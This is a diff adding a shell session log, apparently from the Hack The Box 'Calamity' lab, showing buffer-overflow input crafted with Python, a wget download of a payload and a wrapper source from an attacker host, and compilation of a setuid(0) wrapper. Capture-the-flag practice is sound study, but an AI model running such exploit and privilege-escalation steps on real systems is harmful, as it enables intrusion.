@@ -1,0 +1,58 @@
+root@parrot:~/hackthebox/calamity# ssh xalvas@10.10.10.27                       
+xalvas@10.10.10.27's password:          
+Permission denied, please try again.    
+xalvas@10.10.10.27's password:          
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)                 
+
+ * Documentation:  https://help.ubuntu.com                                      
+ * Management:     https://landscape.canonical.com                              
+ * Support:        https://ubuntu.com/advantage                                 
+
+9 packages can be updated.              
+8 updates are security updates.         
+
+
+Last login: Wed Jan 15 06:54:35 2020 from 10.10.14.14                           
+xalvas@calamity:~$ clear                
+xalvas@calamity:~$ cd /home/xalvas/app/ 
+xalvas@calamity:~/app$ ls               
+goodluck  src.c                         
+xalvas@calamity:~/app$ mkdir /tmp/rs    
+xalvas@calamity:~/app$ python -c 'import struct;print "A"*8+struct.pack("I", 0xBFFFF5E8)' > /tmp/rs/f1                                                          
+xalvas@calamity:~/app$ python -c 'import struct;print struct.pack("I", <strong>0x1035935</strong>)+"A"*4+struct.pack("I", 0x80002ff4)' > /tmp/rs/f2             
+  File "<string>", line 1               
+    import struct;print struct.pack("I", <strong>0x1035935</strong>)+"A"*4+struct.pack("I", 0x80002ff4)                                                         
+                                         ^                                      
+SyntaxError: invalid syntax             
+xalvas@calamity:~/app$ python -c 'import struct;print struct.pack("I",0x1035935)+"A"*4+struct.pack("I", 0x80002ff4)' > /tmp/rs/f2                               
+xalvas@calamity:~/app$ wget -O /tmp/rs/payload http://10.10.14.14:8000/payload                                                                                  
+--2020-01-15 07:08:07--  http://10.10.14.14:8000/payload                        
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 101 [application/octet-stream]  
+Saving to: ‘/tmp/rs/payload’            
+
+/tmp/rs/payload                         100%[===============================================================================>]     101  --.-KB/s    in 0s       
+
+2020-01-15 07:08:08 (7.94 MB/s) - ‘/tmp/rs/payload’ saved [101/101]             
+
+xalvas@calamity:~/app$ wget -O /tmp/rs/wrapper.c http://10.10.14.14:8000/wrapper.c                                                                              
+--2020-01-15 07:09:00--  http://10.10.14.14:8000/wrapper.c                      
+Connecting to 10.10.14.14:8000... connected.                                    
+HTTP request sent, awaiting response... 200 OK                                  
+Length: 99 [text/plain]                 
+Saving to: ‘/tmp/rs/wrapper.c’          
+
+/tmp/rs/wrapper.c                       100%[===============================================================================>]      99  --.-KB/s    in 0s       
+
+2020-01-15 07:09:02 (8.58 MB/s) - ‘/tmp/rs/wrapper.c’ saved [99/99]             
+
+xalvas@calamity:~/app$ gcc -o /tmp/rs/wrapper12345678912345678 /tmp/rs/wrapper.c
+/tmp/rs/wrapper.c: In function ‘main’:  
+/tmp/rs/wrapper.c:5:2: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]                                                     
+  setuid(0);                            
+  ^                                     
+/tmp/rs/wrapper.c:6:2: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]                                                     
+  setgid(0);                            
+  ^                                     
+xalvas@calamity:~/app$                  
